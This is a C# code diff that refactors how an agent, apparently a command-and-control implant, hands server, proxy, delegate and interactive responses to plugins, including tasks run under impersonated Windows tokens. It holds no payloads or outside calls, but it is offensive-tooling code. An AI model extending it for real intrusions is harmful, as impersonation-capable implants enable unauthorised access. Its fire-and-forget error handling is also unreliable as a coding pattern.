@@ -3,6 +3,7 @@ using Agent.Models;
 using Agent.Utilities;
 using System.Security.Principal;
 using System.Text.Json;
+using System.Text.Json.Serialization;
 
 namespace Agent.Managers
 {
@@ -72,17 +73,15 @@ namespace Agent.Managers
                     {
                         try
                         {
-                            if (job.task.token != 0 && OperatingSystem.IsWindows())
+                            if(job.task.token != 0)
                             {
-                                WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
-                                {
-                                    plug.Execute(job);
-                                });
+                                tokenManager.RunTaskImpersonated(plug, job);
                             }
                             else
                             {
                                 plug.Execute(job);
                             }
+
                         }
                         catch (Exception e)
                         {
@@ -101,34 +100,32 @@ namespace Agent.Managers
         }
         public async Task HandleServerResponses(List<ServerResponseResult> responses)
         {
-            Parallel.ForEach(responses, async response =>
+            foreach(var response in responses)
             {
                 ServerJob job;
 
-                if(!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
+                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                 {
                     return;
                 }
 
-                if (job.task.token > 0 && OperatingSystem.IsWindows())
+                if(plugin is null)
                 {
-                    await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
-                    {
-                        try
-                        {
-                            plugin.HandleNextMessage(response);
-                        }
-                        catch { }
-                    });
+                    return;
+                }
+
+                if (job.task.token > 0)
+                {
+                    Task.Run(() => tokenManager.HandleFilePluginImpersonated(plugin, job, response));
                     return;
                 }
 
                 try
                 {
-                    plugin.HandleNextMessage(response);
+                    Task.Run(() => plugin.HandleNextMessage(response));
                 }
                 catch { }
-            });
+            }
         }
         public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
         {
@@ -137,20 +134,26 @@ namespace Agent.Managers
                 return;
             }
 
-            Parallel.ForEach(responses, async response =>
+            if (plugin is null)
             {
-                try
-                {
-                    plugin.HandleDatagram(response);
-                }
-                catch { }
-            });
+                return;
+            }
+
+            foreach (var response in responses)
+            {
+                Task.Run(() => plugin.HandleDatagram(response));
+            }
         }
         public async Task HandleDelegateResponses(List<DelegateMessage> responses)
         {
             foreach(var response in responses)
             {
                 if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
+                {
+                    return;
+                }
+
+                if (plugin is null)
                 {
                     return;
                 }
@@ -164,7 +167,7 @@ namespace Agent.Managers
         }
         public async Task HandleInteractiveResponses(List<InteractMessage> responses)
         {
-            Parallel.ForEach(responses, async response =>
+            foreach(var response in responses)
             {
                 ServerJob job;
 
@@ -173,27 +176,18 @@ namespace Agent.Managers
                     return;
                 }
 
-                if (job.task.token > 0 && OperatingSystem.IsWindows())
+                if (job.task.token > 0)
                 {
-                    await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
-                    {
-                        try
-                        {
-                            plugin.Interact(response);
-                        }
-                        catch { }
-                    });
-
+                    Task.Run(() => tokenManager.HandleInteractivePluginImpersonated(plugin, job, response));
                     return;
                 }
 
                 try
                 {
-                    plugin.Interact(response);
+                    Task.Run(() => plugin.Interact(response));
                 }
                 catch { }
-
-            });
+            }
         }
     }
 }
